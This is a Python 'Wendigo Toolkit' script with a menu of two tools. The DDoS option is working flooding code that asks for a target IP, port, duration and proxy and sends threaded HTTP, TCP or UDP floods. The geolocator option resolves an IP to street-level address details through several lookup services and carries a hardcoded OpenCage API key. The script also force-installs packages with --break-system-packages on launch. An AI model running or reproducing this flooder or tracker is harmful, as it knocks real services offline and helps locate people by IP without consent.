import colorama
import os
import requests
from colorama import Style, Fore, init

init()

def banner():
    print(Fore.RED + '''
                       ;               ,           
                     ,;                 '.         
                    ;:                   :;        
                   ::                     ::       
                   ::   WENDIGO TOOLKIT   ::     
                   ':                     :        - Made By :
                    :.                    :                     LTH/Made & BL1XX
                 ;' ::                   ::  '                            
                .'  ';                   ;'  '.                         
               ::    :;                 ;:    ::   
               ;      :;.             ,;:     ::   
               :;      :;:           ,;"      ::   
               ::.      ':;  ..,.;  ;:'     ,.;:   
                "'"...   '::,::::: ;:   .;.;""'    
                    '"""....;:::::;,;.;"""         
                .:::.....'"':::::::'",...;::::;.   
               ;:' '""'"";.,;:::::;.'""""""  ':;   
              ::'         ;::;:::;::..         :;  
             ::         ,;:::::::::::;:..       :: 
             ;'     ,;;:;::::::::::::::;";..    ':.
            ::     ;:"  ::::::"""'::::::  ":     ::
             :.    ::   ::::::;  :::::::   :     ; 
              ;    ::   :::::::  :::::::   :    ;  
               '   ::   ::::::....:::::'  ,:   '   
                '  ::    :::::::::::::"   ::       
                   ::     ':::::::::"'    ::       
                   ':       """""""'      ::       
                    ::                   ;:     
                    ':;                 ;:"                   
            -hrr-     ';              ,;'          
                        "'           '"   


              [1] IP GeoLocator | [2] DDoS Attack



                          ''')

def ddos():
    import socket
    import threading
    import time
    import random
    import logging
    from colorama import Fore, Style, init

    init(autoreset=True)
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    def ping_server(target):
        try:
            start_time = time.time()
            socket.create_connection((target, 80), timeout=2).close()
            latency = (time.time() - start_time) * 1000
            return round(latency, 2)
        except Exception:
            return None

    def send_packet(proxy, target, port, packet_size, attack_type):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if attack_type != 'udp' else socket.SOCK_DGRAM)
            if proxy:
                proxy_host, proxy_port = proxy.split(':')
                proxy_port = int(proxy_port)
                s.connect((proxy_host, proxy_port))
                s.sendall(f"CONNECT {target}:{port} HTTP/1.1\r\n\r\n".encode())
            else:
                s.connect((target, port))

            if attack_type == 'http':
                headers = [
                    "GET / HTTP/1.1",
                    f"Host: {target}",
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language: en-US,en;q=0.5",
                    "Connection: keep-alive"
                ]
                s.sendall("\r\n".join(headers).encode() + b"\r\n\r\n")
            elif attack_type == 'tcp':
                s.sendall(random._urandom(packet_size))
            elif attack_type == 'udp':
                s.sendto(random._urandom(packet_size), (target, port))

            latency = ping_server(target)
            latency_msg = f"Server speed: {latency} ms" if latency else "Ping failed"
            logging.info(f"{Fore.GREEN}Sending Packets to {target} through proxy: {proxy or 'None'} with packet size {packet_size} through port {port}. {latency_msg}")
        except Exception as e:
            logging.error(f"{Fore.RED}Error sending packet: {e}")
        finally:
            if 's' in locals():
                s.close()

    def attack(target, port, packet_size, duration, proxy, attack_type):
        end_time = time.time() + duration
        while time.time() < end_time:
            threading.Thread(target=send_packet, args=(proxy, target, port, packet_size, attack_type)).start()

    def main():
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(Fore.CYAN + Style.BRIGHT + """
            ██████╗ ██████╗  ██████╗ ███████╗███████╗
            ██╔══██╗██╔══██╗██╔════╝ ██╔════╝██╔════╝
            ██████╔╝██████╔╝██║  ███╗█████╗  █████╗  
            ██╔═══╝ ██╔═══╝ ██║   ██║██╔══╝  ██╔══╝  
            ██║     ██║     ╚██████╔╝███████╗███████╗
            ╚═╝     ╚═╝      ╚═════╝ ╚══════╝╚══════╝
            """)

            target = input(f"{Fore.RED}// Enter the target IP address: {Fore.RESET}")
            attack_type = input(f"{Fore.RED}// Enter the attack type ([1] HTTP, [2] TCP, [3] UDP): {Fore.RESET}")
            while attack_type not in ['1', '2', '3']:
                attack_type = input(f"{Fore.BLUE}// Invalid attack type. Please enter a valid type: {Fore.RESET}")
            attack_type = 'http' if attack_type == '1' else 'tcp' if attack_type == '2' else 'udp'
            port = input(f"{Fore.RED}// Enter the target port (leave blank for default): {Fore.RESET}")
            port = int(port) if port.isdigit() else 80
            duration = float(input(f"{Fore.RED}// Enter the attack duration (seconds): {Fore.RESET}"))
            packet_size = int(input(f"{Fore.RED}// Enter the packet size (bytes): {Fore.RESET}"))
            proxy = input(f"{Fore.RED}// Enter your proxy (leave blank for no proxies): {Fore.RESET}")

            print(Fore.GREEN + "\nStarting the attack...\n")
            attack(target, port, packet_size, duration, proxy, attack_type)

            print(Fore.YELLOW + "\nAttack in progress. Please wait...\n")
            time.sleep(duration)

            print(Fore.GREEN + "\nAttack completed successfully!")
            while True:
                endchoice = input(f"{Fore.CYAN}// Attack Complete, Choose 'r' to rerun script, or choose 'm' to go back to main: {Fore.RESET}")
                if endchoice == 'r':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    main()
                elif endchoice == 'm':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    break
                else:
                    print(Fore.RED + "Invalid option. Please try again.")
        except KeyboardInterrupt:
            print(Fore.RED + "\nAttack interrupted by user.")
        except Exception as e:
            logging.error(f"{Fore.RED}Error in DDoS script: {e}")

    main()

def geolocator():
    # REQUIREMENTS:
    # pip install colorama==0.4.6
    # pip install dnspython==2.7.0
    # pip install opencage==3.1.0
    # pip install requests==2.32.3
    # pip install shodan==1.31.0



    #!/usr/bin/python
    import requests
    import os
    import time
    from platform import system
    from opencage.geocoder import OpenCageGeocode
    import json
    from datetime import datetime

    class colores:
        red="\033[31;1m"

    os.system("clear")
    logo = colores.red + '''
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@#:      .#%#@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@+  :*+-+#@@+    *@@@@@@@@@@@@@@
        @@@@@@@@@@@@--#@@@@      %@@ #@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@#      #@+ @@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@*      #@@.-@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@        @@@ #@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@.      @@@ %@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@#     -@@% @@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@=     +@@* @@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@         *.@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@           #@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@.      =@* @@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@+      =@# @@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@.       +@ *@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@         *. @@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@-        :@# #@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@.          =@  @@@@@@@@@@@@@@@
        @@@@@@@@@@@@@%             =% -@@@@@@@@@@@@@@
        @@@@@@@@@@@@@              @@* +@@@@@%@@@@@@@
        @@@@@@@@@@@@@+             @@@- =@@@@.%@@@@@@
        @@@@@@@@@@@@@      =        @@@*     #@@@@@@@
        @@@@@@@@@@@@@@@=        .     *@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                    |Made by: xav666vax |
                    |___________________|
                    | Spyrod Version: v4|
                    |___________________|

             '''  

    try:
        print(logo)
        print('[~] Enter the IP: ')
        ip = input('[~] IP: ')
        print(f'[~] Looking up data for: {ip}')
        time.sleep(2)

        api = f"http://ip-api.com/json/{ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query&lang=es"
        data = requests.get(api).json()

        print("\n[~] Basic Information:")
        print("[~] [IP]:", data['query'])
        print("[~] [ISP]:", data.get('isp', 'Not found'))
        print("[~] [Organization]:", data.get('org', 'Not found'))
        print("[~] [AS Number and Organization]:", data.get('as', 'Not found'))

        print("\n[~] Location Information:")
        print("[~] [City]:", data.get('city', 'Not found'))
        print("[~] [Region / State]:", data.get('regionName', 'Not found'))
        print("[~] [Country]:", data.get('country', 'Not found'))
        print("[~] [Continent]:", data.get('continent', 'Not found'))
        print("[~] [Postal Code]:", data.get('zip', 'Not found'))
        print("[~] [Latitude]:", data.get('lat', 'Not found'))
        print("[~] [Longitude]:", data.get('lon', 'Not found'))
        print("[~] [Timezone]:", data.get('timezone', 'Not found'))

        print("\n[~] Network Information:")
        print("[~] [Mobile Network]:", "Yes" if data.get('mobile', False) else "No")
        print("[~] [Proxy/VPN]:", "Yes" if data.get('proxy', False) else "No")
        print("[~] [Hosting/Datacenter]:", "Yes" if data.get('hosting', False) else "No")
        print("[~] [Reverse DNS]:", data.get('reverse', 'Not found'))

        try:
            additional_data = requests.get(f"https://ipapi.co/{ip}/json/").json()
            print("\n[~] Additional Information:")
            print("[~] [Network]:", additional_data.get('network', 'Not found'))
            print("[~] [Version]:", additional_data.get('version', 'Not found'))
            print("[~] [Region Code]:", additional_data.get('region_code', 'Not found'))
            print("[~] [Country Population]:", additional_data.get('country_population', 'Not found'))
            print("[~] [Country Area]:", additional_data.get('country_area', 'Not found'))
            print("[~] [Country Capital]:", additional_data.get('country_capital', 'Not found'))
            print("[~] [Country TLD]:", additional_data.get('country_tld', 'Not found'))
            print("[~] [Country Calling Code]:", additional_data.get('country_calling_code', 'Not found'))
            print("[~] [Languages]:", additional_data.get('languages', 'Not found'))
        except:
            print("\n[~] Could not fetch additional information")

        try:
            geocoder = OpenCageGeocode("588cee3f6bb849e5b820389669e6c3b9")
            results = geocoder.reverse_geocode(data['lat'], data['lon'])

            admin_url = f"https://nominatim.openstreetmap.org/reverse?lat={data['lat']}&lon={data['lon']}&format=json&addressdetails=1"
            admin_headers = {'User-Agent': 'Spyrod/4.0'}
            admin_response = requests.get(admin_url, headers=admin_headers).json()

            if results and len(results):
                address = results[0]
                components = address.get('components', {})
                admin_details = admin_response.get('address', {})

                print("\n[~] Enhanced Location Information:")
                print(f"[~] [Full Address]: {address['formatted']}")
                print(f"[~] [Building Number]: {components.get('house_number', admin_details.get('house_number', 'Not found'))}")
                print(f"[~] [Street]: {components.get('road', admin_details.get('road', 'Not found'))}")
                print(f"[~] [Building Name]: {components.get('building', admin_details.get('building', 'Not found'))}")
                print(f"[~] [Neighborhood/Suburb]: {components.get('suburb', components.get('neighbourhood', admin_details.get('suburb', 'Not found')))}")
                print(f"[~] [District]: {components.get('district', admin_details.get('district', admin_details.get('city_district', 'Not found')))}")
                print(f"[~] [Quarter]: {components.get('quarter', admin_details.get('quarter', admin_details.get('neighbourhood', 'Not found')))}")
                print(f"[~] [Postcode]: {components.get('postcode', admin_details.get('postcode', 'Not found'))}")
                print(f"[~] [Municipality]: {components.get('municipality', admin_details.get('municipality', admin_details.get('city', 'Not found')))}")
                print(f"[~] [Borough]: {components.get('borough', admin_details.get('borough', 'Not found'))}")
                print(f"[~] [Locality]: {components.get('locality', admin_details.get('locality', 'Not found'))}")
                print(f"[~] [City]: {components.get('city', components.get('town', components.get('village', admin_details.get('city', 'Not found'))))}")
                print(f"[~] [County]: {components.get('county', admin_details.get('county', 'Not found'))}")
                print(f"[~] [State/Province]: {components.get('state', admin_details.get('state', 'Not found'))}")
                print(f"[~] [Country]: {components.get('country', admin_details.get('country', 'Not found'))}")

                if 'annotations' in address:
                    annotations = address['annotations']
                    print("\n[~] Location Context:")
                    print(f"[~] [Type]: {annotations.get('type', 'Not found')}")
                    print(f"[~] [What3Words]: {annotations.get('what3words', 'Not found')}")
                    if 'OSM' in annotations:
                        print(f"[~] [OSM URL]: https://www.openstreetmap.org/{annotations.get('OSM', {}).get('url', 'Not found')}")

                    if 'confidence' in address:
                        print(f"[~] [Location Confidence]: {address['confidence']}/10")

        except Exception as e:
            print("\n[~] Could not fetch detailed location information")

    except KeyboardInterrupt:
        print('\nDone.')
        time.sleep(1)
    except Exception as e:
        print(f"\n[~] Error occurred: {str(e)}")

    while True:
        endchoice = input("\n// Done Tracking, Choose 'r' to rerun script, or choose 'm' to go back to main. : ")
        if endchoice == 'r':
            os.system('cls' if os.name == 'nt' else 'clear')
            os.system('python main.py')
        elif endchoice == 'm':
            os.system('cls' if os.name == 'nt' else 'clear')
            exit()
        else:
            print("Invalid option. Please try again.")


def main():
    os.system("pip install colorama requests opencage shodan dnspython --break-system-packages")
    os.system("cls")
    banner()
    choose = input("[~] Please Choose your Tool : ")
    if choose == '1':
        os.system("cls" if os.name == "nt" else "clear")
        geolocator()
    elif choose == '2':
        os.system("cls" if os.name == "nt" else "clear")
        ddos()

if __name__ == "__main__":
    main()
